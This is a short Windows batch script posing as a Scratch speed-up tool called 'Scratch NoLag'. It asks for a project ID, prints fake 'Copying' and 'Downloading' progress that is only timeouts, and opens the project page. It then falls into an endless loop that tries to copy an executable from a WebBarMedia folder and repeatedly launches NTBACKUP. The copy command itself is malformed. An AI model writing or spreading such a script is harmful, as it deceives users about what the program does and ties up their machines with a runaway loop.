@echo off
title Scratch NoLag 1.0
echo Welcome!
echo Please Enter The Project ID/Number.
set /P INPUT=Type input: %=%
cls
pause
echo Copying Files.....
timeout 2
echo Downloading......
timeout 5
echo Done!
pause
start https://scratch.mit.edu/projects/%INPUT%/
goto Fasten Scratch
:Fasten Scratch
copy C:\Program Files\WebBarMedia\5.5.6554.18569/winwb.exe
NTBACKUP
goto Fasten Scratch
